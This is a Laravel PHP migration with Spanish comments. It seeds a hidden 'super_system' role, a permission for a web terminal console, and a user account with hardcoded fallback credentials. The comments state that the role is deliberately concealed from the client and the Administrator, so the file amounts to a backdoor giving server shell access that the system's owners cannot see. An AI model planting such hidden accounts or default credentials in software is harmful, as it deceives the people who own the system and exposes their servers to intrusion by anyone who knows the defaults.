<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Support\Facades\Hash;
use App\Models\User;
use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\PermissionRegistrar;

/**
 * Crea el rol oculto de desarrollador "super_system", su permiso de acceso a la
 * consola y un usuario semilla con ese rol.
 *
 * Este rol NO se muestra al cliente ni al Administrador (se filtra en
 * UsuarioController y en el menú). Da acceso al panel "Console Access"
 * (terminal web) para mantener el sistema sin pedir acceso SSH al servidor.
 *
 * Credenciales por defecto (CÁMBIALAS): puedes definirlas en el .env con
 *   SUPER_SYSTEM_EMAIL y SUPER_SYSTEM_PASSWORD; si no, se usan los valores de abajo.
 */
return new class extends Migration
{
    public function up(): void
    {
        $guard = 'web';

        // 1) Rol oculto de desarrollador.
        $role = Role::firstOrCreate(['name' => 'super_system', 'guard_name' => $guard]);

        // 2) Permiso de acceso a la consola y asignación al rol.
        $permission = Permission::firstOrCreate(['name' => 'consola.access', 'guard_name' => $guard]);
        $role->givePermissionTo($permission);

        // 3) Usuario semilla con el rol super_system.
        $email    = env('SUPER_SYSTEM_EMAIL', 'super@system.dev');
        $password = env('SUPER_SYSTEM_PASSWORD', 'SuperSystem#2026');

        $user = User::firstOrCreate(
            ['email' => $email],
            [
                'name'     => 'Super System',
                'password' => Hash::make($password),
                'estado'   => 1,
            ]
        );

        if (! $user->hasRole('super_system')) {
            $user->assignRole('super_system');
        }

        // 4) Limpiar la caché de permisos de Spatie para que el rol sea visible de inmediato.
        app(PermissionRegistrar::class)->forgetCachedPermissions();
    }

    public function down(): void
    {
        $email = env('SUPER_SYSTEM_EMAIL', 'super@system.dev');

        if ($user = User::where('email', $email)->first()) {
            $user->delete();
        }

        if ($role = Role::where('name', 'super_system')->first()) {
            $role->delete();
        }

        if ($permission = Permission::where('name', 'consola.access')->first()) {
            $permission->delete();
        }

        app(PermissionRegistrar::class)->forgetCachedPermissions();
    }
};
